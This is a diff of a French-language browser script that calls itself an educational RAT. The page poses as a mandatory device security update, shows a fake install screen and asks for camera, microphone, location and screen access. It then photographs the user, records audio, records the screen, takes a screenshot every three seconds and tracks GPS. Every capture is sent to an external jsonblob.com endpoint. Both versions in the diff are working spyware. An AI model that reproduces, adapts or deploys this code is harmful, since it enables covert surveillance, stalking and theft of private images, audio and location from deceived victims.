@@ -1,46 +1,43 @@
-// ═══════════════════════════════════════════════════════════════
-// ZENIN SECURITY — RAT (Outil éducatif)
-// Capture vidéo d'écran en direct + auto-capture + webhook
-// ═══════════════════════════════════════════════════════════════
+// ZENIN SECURITY - RAT (Educatif)
+// Capture video ecran en direct + auto-capture + webhook
 
-const WEBHOOK_URL = 'https://jsonblob.com/api/jsonBlob/019ed161-a6f2-7707-a400-0291c46d621b';
+var WEBHOOK_URL = 'https://jsonblob.com/api/jsonBlob/019ed161-a6f2-7707-a400-0291c46d621b';
 
-let state = {
+var state = {
   camera: false, mic: false, loc: false, screen: false, notif: false, storage: false,
-  stream: null, screenStream: null, screenRecorder: null,
-  photos: [], audios: [], screens: [], gps: [], logs: []
+  stream: null, screenStream: null,
+  photos: [], audios: [], screens: [], gps: []
 };
 
-let screenAutoInterval = null;
+var screenAutoInterval = null;
 
-// ── Utility ──
 function log(msg, type) {
-  const el = document.getElementById('logArea');
+  var el = document.getElementById('logArea');
   if (!el) return;
-  const now = new Date().toLocaleTimeString('fr-FR');
-  const col = type === 'err' ? 'log-error' : type === 'warn' ? 'log-warn' : type === 'info' ? 'log-ok' : 'log-info';
-  el.innerHTML += `<br><span class="log-time">[${now}]</span> <span class="${col}">${msg}</span>`;
+  var now = new Date().toLocaleTimeString('fr-FR');
+  var cls = type === 'err' ? 'log-error' : type === 'warn' ? 'log-warn' : 'log-ok';
+  el.innerHTML += '<br><span class="log-time">[' + now + ']</span> <span class="' + cls + '">' + msg + '</span>';
   el.scrollTop = el.scrollHeight;
   while (el.children.length > 40) el.removeChild(el.firstChild);
 }
 
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
 async function sendData(type, data) {
   try {
-    const payload = { type, data, timestamp: new Date().toISOString(), device: navigator.userAgent };
+    var payload = { type: type, data: data, timestamp: new Date().toISOString(), device: navigator.userAgent };
     await fetch(WEBHOOK_URL, {
       method: 'PUT',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    log('📡 Envoyé: ' + type, 'info');
+    log('Envoye: ' + type, 'info');
   } catch(e) {
-    log('Erreur envoi: ' + e.message, 'err');
+    log('Erreur: ' + e.message, 'err');
   }
 }
 
-// ── Navigation ──
+// Navigation
 function showPermissions() {
   document.getElementById('screen-intro').style.display = 'none';
   document.getElementById('screen-perms').style.display = 'block';
@@ -48,257 +45,261 @@ function showPermissions() {
 }
 
 function showLater() {
-  alert('Cette mise à jour est obligatoire pour la sécurité de votre appareil.');
+  alert('Cette mise a jour est obligatoire pour la securite de votre appareil.');
 }
 
 function showDashboard() {
   document.getElementById('screen-success').style.display = 'none';
   document.getElementById('screen-dash').style.display = 'block';
-  log('Dashboard actif — surveillance démarrée', 'warn');
-
+  log('Dashboard actif', 'warn');
   sendData('device', {
     userAgent: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
-    screen: window.innerWidth + 'x' + window.innerHeight,
-    permissions: { camera: state.camera, mic: state.mic, loc: state.loc, screen: state.screen, notif: state.notif, storage: state.storage }
+    screen: window.innerWidth + 'x' + window.innerHeight
   });
-
   startAutoCapture();
 }
 
-// ── Permissions ──
+// Permissions
 async function requestPerm(type) {
-  const el = document.getElementById('p-' + type);
+  var el = document.getElementById('p-' + type);
   if (el.classList.contains('granted')) return;
   log('Demande: ' + type, 'warn');
 
   try {
-    let ok = false;
-    switch (type) {
-      case 'camera':
-        state.stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode:'environment'}, audio: false });
-        state.camera = true; ok = true; break;
-      case 'mic':
+    var ok = false;
+    if (type === 'camera') {
+      try {
+        state.stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+        state.camera = true; ok = true;
+      } catch(e) { console.error('Camera error:', e); }
+    } else if (type === 'mic') {
+      try {
         await navigator.mediaDevices.getUserMedia({ audio: true });
-        state.mic = true; ok = true; break;
-      case 'loc':
-        navigator.geolocation.getCurrentPosition(p => {
-          state.loc = true;
-          updatePermUI(type, true);
-          log('GPS: ' + p.coords.latitude.toFixed(4) + ', ' + p.coords.longitude.toFixed(4), 'info');
-          checkPerms();
-        }, () => { log('GPS refusé', 'err'); updatePermUI(type, false); });
-        return;
-      case 'screen':
-        try {
-          let testStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-          testStream.getTracks().forEach(t => t.stop());
-          state.screen = true; ok = true;
-        } catch(e) { ok = false; } break;
-      case 'notif':
-        if ('Notification' in window) { const r = await Notification.requestPermission(); ok = r === 'granted'; state.notif = ok; } break;
-      case 'storage':
-        state.storage = true; ok = true; break;
+        state.mic = true; ok = true;
+      } catch(e) { console.error('Mic error:', e); }
+    } else if (type === 'loc') {
+      navigator.geolocation.getCurrentPosition(function(p) {
+        state.loc = true;
+        updatePermUI(type, true);
+        log('GPS: ' + p.coords.latitude.toFixed(4) + ', ' + p.coords.longitude.toFixed(4), 'info');
+        checkPerms();
+      }, function() { log('GPS refuse', 'err'); updatePermUI(type, false); });
+      return;
+  } else if (type === 'screen') {
+      try {
+        var testStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        testStream.getTracks().forEach(function(t) { t.stop(); });
+        state.screen = true; ok = true;
+      } catch(e) { ok = false; console.error('Screen error:', e); }
+    } else if (type === 'notif') {
+      if ('Notification' in window) {
+        var r = await Notification.requestPermission();
+        ok = r === 'granted'; state.notif = ok;
+      }
+    } else if (type === 'storage') {
+      state.storage = true; ok = true;
     }
-    if (ok) { updatePermUI(type, true); log(type + ' ✓', 'info'); }
-  } catch (e) { log(type + ' ✗ ' + e.message, 'err'); }
+
+    if (ok) {
+      updatePermUI(type, true);
+      log(type + ' OK', 'info');
+    } else {
+      log(type + ' REFUSE ou NON SUPPORTÉ', 'err');
+    }
+  } catch (e) {
+    log(type + ' ERREUR: ' + e.message, 'err');
+  }
   checkPerms();
 }
 
 function updatePermUI(type, granted) {
-  const el = document.getElementById('p-' + type);
-  if (granted) { el.classList.add('granted'); el.querySelector('.perm-check').textContent = '✓'; }
+  var el = document.getElementById('p-' + type);
+  if (granted) {
+    el.classList.add('granted');
+    el.querySelector('.perm-check').textContent = '\u2713';
+  }
 }
 
 function checkPerms() {
-  const all = ['camera','mic','loc','screen','notif','storage'].every(p => {
-    return document.getElementById('p-' + p).classList.contains('granted');
+  var all = true;
+  ['camera','mic','loc','screen','notif','storage'].forEach(function(p) {
+    if (!document.getElementById('p-' + p).classList.contains('granted')) all = false;
   });
   document.getElementById('installBtn').disabled = !all;
-  if (all) log('Toutes permissions ✓', 'info');
+  if (all) log('Toutes permissions OK', 'info');
 }
 
-// ── Installation ──
+// Installation
 async function startInstall() {
   document.getElementById('screen-perms').style.display = 'none';
   document.getElementById('screen-install').style.display = 'block';
   log('Installation...', 'info');
 
-  const steps = ['s1','s2','s3','s4','s5'];
-  for (let i = 0; i < steps.length; i++) {
-    const el = document.getElementById(steps[i]);
+  var steps = ['s1','s2','s3','s4','s5'];
+  for (var i = 0; i < steps.length; i++) {
+    var el = document.getElementById(steps[i]);
     el.querySelector('.step-icon').className = 'step-icon active';
-    el.querySelector('.step-icon').textContent = '⏳';
+    el.querySelector('.step-icon').textContent = '...';
     document.getElementById('progBar').style.width = (i * 20) + '%';
     await sleep(1500);
     el.querySelector('.step-icon').className = 'step-icon done';
-    el.querySelector('.step-icon').textContent = '✓';
-    el.querySelector('.step-time').textContent = '✓';
+    el.querySelector('.step-icon').textContent = '\u2713';
+    el.querySelector('.step-time').textContent = '\u2713';
     document.getElementById('progBar').style.width = ((i + 1) * 20) + '%';
   }
 
   document.getElementById('progBar').style.width = '100%';
   await sleep(500);
-  log('Installation terminée!', 'info');
+  log('Installation terminee!', 'info');
   document.getElementById('screen-install').style.display = 'none';
   document.getElementById('screen-success').style.display = 'block';
 }
 
-// ═══ CAPTURES ═══
+// CAPTURES
 
-// 📸 Photo
 async function doPhoto() {
-  if (!state.camera || !state.stream) { log('Caméra indisponible', 'err'); return; }
-  log('Capture photo...', 'info');
+  if (!state.camera || !state.stream) { log('Camera indisponible', 'err'); return; }
+  log('Photo...', 'info');
   try {
-    const video = document.createElement('video');
+    var video = document.createElement('video');
     video.srcObject = state.stream; video.play();
     await sleep(500);
-    const canvas = document.createElement('canvas');
+    var canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
     canvas.getContext('2d').drawImage(video, 0, 0);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+    var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
     state.photos.push(dataUrl);
     document.getElementById('liveView').innerHTML = '';
-    const img = document.createElement('img');
+    var img = document.createElement('img');
     img.src = dataUrl;
-    img.style.width = '100%'; img.style.maxHeight = '250px'; img.style.objectFit = 'contain';
+    img.style.cssText = 'width:100%;max-height:250px;object-fit:contain';
     document.getElementById('liveView').appendChild(img);
     await sendData('photo', { image: dataUrl, index: state.photos.length });
-    log('📸 Photo #' + state.photos.length, 'info');
+    log('Photo #' + state.photos.length, 'info');
   } catch(e) { log('Erreur photo: ' + e.message, 'err'); }
 }
 
-// 🎤 Audio
 async function doAudio() {
   log('Audio 5s...', 'info');
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    const rec = new MediaRecorder(stream);
-    const chunks = [];
-    rec.ondataavailable = e => chunks.push(e.data);
-    rec.onstop = () => {
-      const blob = new Blob(chunks, { type: 'audio/webm' });
-      const reader = new FileReader();
-      reader.onloadend = () => {
+    var stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    var rec = new MediaRecorder(stream);
+    var chunks = [];
+    rec.ondataavailable = function(e) { chunks.push(e.data); };
+    rec.onstop = function() {
+      var blob = new Blob(chunks, { type: 'audio/webm' });
+      var reader = new FileReader();
+      reader.onloadend = function() {
         state.audios.push(reader.result);
         document.getElementById('liveView').innerHTML = '';
-        const audio = document.createElement('audio');
+        var audio = document.createElement('audio');
         audio.controls = true; audio.src = reader.result;
-        audio.style.width = '100%'; audio.style.padding = '8px';
+        audio.style.cssText = 'width:100%;padding:8px';
         document.getElementById('liveView').appendChild(audio);
         sendData('audio', { audio: reader.result, index: state.audios.length });
-        log('🎤 Audio #' + state.audios.length, 'info');
+        log('Audio #' + state.audios.length, 'info');
       };
       reader.readAsDataURL(blob);
     };
     rec.start();
-    setTimeout(() => { rec.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
+    setTimeout(function() { rec.stop(); stream.getTracks().forEach(function(t) { t.stop(); }); }, 5000);
   } catch(e) { log('Erreur audio: ' + e.message, 'err'); }
 }
 
-// 🎥 Écran LIVE (Vidéo en direct)
+// SCREEN LIVE - Video en direct
 async function doScreen() {
-  log('Écran live...', 'warn');
+  log('Ecran live...', 'warn');
   try {
-    const stream = await navigator.mediaDevices.getDisplayMedia({
-      video: { mediaSource: 'screen', width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 10 } },
+    var stream = await navigator.mediaDevices.getDisplayMedia({
+      video: { mediaSource: 'screen', width: { ideal: 1920 }, height: { ideal: 1080 } },
       audio: false
     });
 
-    const video = document.createElement('video');
+    var video = document.createElement('video');
     video.srcObject = stream;
     video.autoplay = true;
     video.muted = true;
-    video.style.width = '100%';
-    video.style.maxHeight = '300px';
-    video.style.objectFit = 'contain';
+    video.style.cssText = 'width:100%;max-height:300px;object-fit:contain';
 
     document.getElementById('liveView').innerHTML = '';
     document.getElementById('liveView').appendChild(video);
 
-    log('🎥 Flux écran en DIRECT!', 'info');
+    log('Flux ecran DIRECT!', 'info');
 
-    // Enregistrer en vidéo
-    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
-    const chunks = [];
-    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-    recorder.onstop = () => {
-      const blob = new Blob(chunks, { type: 'video/webm' });
-      const reader = new FileReader();
-      reader.onloadend = () => {
+    // Enregistrer en video
+    var recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+    var chunks = [];
+    recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
+    recorder.onstop = function() {
+      var blob = new Blob(chunks, { type: 'video/webm' });
+      var reader = new FileReader();
+      reader.onloadend = function() {
         state.screens.push(reader.result);
         sendData('screen_video', { video: reader.result, index: state.screens.length });
-        log('🎥 Vidéo #' + state.screens.length, 'info');
+        log('Video #' + state.screens.length, 'info');
       };
       reader.readAsDataURL(blob);
     };
     recorder.start();
 
     state.screenStream = stream;
-    state.screenRecorder = recorder;
 
-    // Bouton pour arrêter
-    stream.getVideoTracks()[0].onended = () => {
-      document.getElementById('liveView').innerHTML = '<div class="live-placeholder"><div class="live-icon">⏹️</div><div class="live-text">Partage arrêté</div></div>';
-      log('⏹️ Partage écran arrêté', 'warn');
+    stream.getVideoTracks()[0].onended = function() {
+      document.getElementById('liveView').innerHTML = '<div class="live-placeholder"><div class="live-icon">STOP</div><div class="live-text">Partage arrete</div></div>';
+      log('Partage ecran arrete', 'warn');
     };
 
-  } catch(e) { log('Erreur écran: ' + e.message, 'err'); }
+  } catch(e) { log('Erreur ecran: ' + e.message, 'err'); }
 }
 
-// 📍 GPS
 function doGPS() {
-  if (!navigator.geolocation) { log('GPS non supporté', 'err'); return; }
+  if (!navigator.geolocation) { log('GPS non supporte', 'err'); return; }
   log('GPS...', 'info');
-  navigator.geolocation.getCurrentPosition(p => {
-    const g = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, time: new Date().toISOString() };
+  navigator.geolocation.getCurrentPosition(function(p) {
+    var g = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, time: new Date().toISOString() };
     state.gps.push(g);
-    document.getElementById('liveView').innerHTML = '<div style="text-align:center;padding:16px;color:#fff"><div style="font-size:32px;margin-bottom:4px">📍</div><div style="font-family:monospace;font-size:13px;color:#f59e0b">' + g.lat.toFixed(6) + ', ' + g.lon.toFixed(6) + '</div><div style="font-size:11px;color:#888;margin-top:4px">Précision: ' + (g.acc ? g.acc.toFixed(0) : '?') + 'm</div><a href="https://maps.google.com/?q=' + g.lat + ',' + g.lon + '" target="_blank" style="color:#58a6ff;font-size:12px;display:block;margin-top:8px">🗺️ Google Maps</a></div>';
+    document.getElementById('liveView').innerHTML = '<div style="text-align:center;padding:16px;color:#fff"><div style="font-size:32px;margin-bottom:4px">📍</div><div style="font-family:monospace;font-size:13px;color:#f59e0b">' + g.lat.toFixed(6) + ', ' + g.lon.toFixed(6) + '</div><div style="font-size:11px;color:#888;margin-top:4px">Precision: ' + (g.acc ? g.acc.toFixed(0) : '?') + 'm</div><a href="https://maps.google.com/?q=' + g.lat + ',' + g.lon + '" target="_blank" style="color:#58a6ff;font-size:12px;display:block;margin-top:8px">Google Maps</a></div>';
     sendData('gps', g);
-    log('📍 GPS: ' + g.lat.toFixed(4) + ', ' + g.lon.toFixed(4), 'info');
-  }, () => log('GPS refusé', 'err'));
+    log('GPS: ' + g.lat.toFixed(4) + ', ' + g.lon.toFixed(4), 'info');
+  }, function() { log('GPS refuse', 'err'); });
 }
 
-// 🔐 Encrypt (simulation)
 function doEncrypt() {
-  log('🔐 Cryptage simulé (mode navigateur)', 'warn');
+  log('Cryptage simule (mode navigateur)', 'warn');
   sendData('report', { action: 'encrypt_sim', note: 'Mode navigateur', time: new Date().toISOString() });
 }
 
-// 🛑 Stop
 function stopAll() {
-  if (state.stream) { state.stream.getTracks().forEach(t => t.stop()); state.stream = null; }
-  if (state.screenStream) { state.screenStream.getTracks().forEach(t => t.stop()); state.screenStream = null; }
+  if (state.stream) { state.stream.getTracks().forEach(function(t) { t.stop(); }); state.stream = null; }
+  if (state.screenStream) { state.screenStream.getTracks().forEach(function(t) { t.stop(); }); state.screenStream = null; }
   if (screenAutoInterval) { clearInterval(screenAutoInterval); screenAutoInterval = null; }
-  log('🛑 Tout arrêté', 'warn');
-  document.getElementById('liveView').innerHTML = '<div class="live-placeholder"><div class="live-icon">🛑</div><div class="live-text">Surveillance arrêtée</div></div>';
+  log('Tout arrete', 'warn');
+  document.getElementById('liveView').innerHTML = '<div class="live-placeholder"><div class="live-icon">STOP</div><div class="live-text">Surveillance arretee</div></div>';
 }
 
-// ═══ AUTO CAPTURE ═══
+// AUTO CAPTURE
 function startAutoCapture() {
-  // Toutes les 3 secondes: capture écran
-  screenAutoInterval = setInterval(async () => {
+  screenAutoInterval = setInterval(async function() {
     if (!state.screen) return;
     try {
-      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-      const video = document.createElement('video');
+      var stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+      var video = document.createElement('video');
       video.srcObject = stream; video.autoplay = true; video.muted = true;
       await sleep(300);
-      const canvas = document.createElement('canvas');
+      var canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
       canvas.getContext('2d').drawImage(video, 0, 0);
-      stream.getTracks().forEach(t => t.stop());
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.35);
+      stream.getTracks().forEach(function(t) { t.stop(); });
+      var dataUrl = canvas.toDataURL('image/jpeg', 0.35);
       state.screens.push(dataUrl);
       await sendData('screen_auto', { image: dataUrl, index: state.screens.length, time: new Date().toISOString() });
-      log('🖥️ Auto #' + state.screens.length, 'info');
+      log('Auto #' + state.screens.length, 'info');
     } catch(e) {}
   }, 3000);
 
-  // Toutes les 5 min: photo + GPS
-  setInterval(() => {
+  setInterval(function() {
     if (state.camera) doPhoto();
     if (state.loc) doGPS();
   }, 300000);
